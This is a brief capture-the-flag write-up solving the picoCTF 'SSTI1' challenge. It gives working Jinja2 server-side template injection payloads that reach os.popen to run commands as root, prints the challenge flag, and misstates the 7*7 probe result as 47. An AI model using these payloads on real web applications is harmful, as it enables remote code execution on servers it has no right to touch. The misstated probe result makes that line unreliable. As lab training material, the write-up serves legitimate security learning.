---
title: SSTI1
ctf: "[[picoCTF]]"
category: "[[Web Exploitation]]"
difficulty: "[[Easy]]"
points: 0
status: Solved
flag_format: picoCTF{...}
date: 2025-05-01
tags:
  - ctf
  - picoctf
  - web
  - exploitation
  - easy
  - picocCTF2025
link: https://play.picoctf.org/practice/challenge/492
---
# [Challenge Description](https://play.picoctf.org/practice/challenge/492)
I made a cool website where you can announce whatever you want! 

Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:57722/)!

# Approach and Steps
`{{7*7}}` returned `47`[therefore](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) it is Jinja2 (Python).

Ran [`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)
Got `uid=0(root) gid=0(root) groups=0(root)` in response, this means that the exploit works.

> This means that i have RCE  

Run: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
Got `__pycache__ app.py flag requirements.txt`  

Running `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` gives the flag.

# Flag

> [!success] Flag
> `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bd4cfc64}`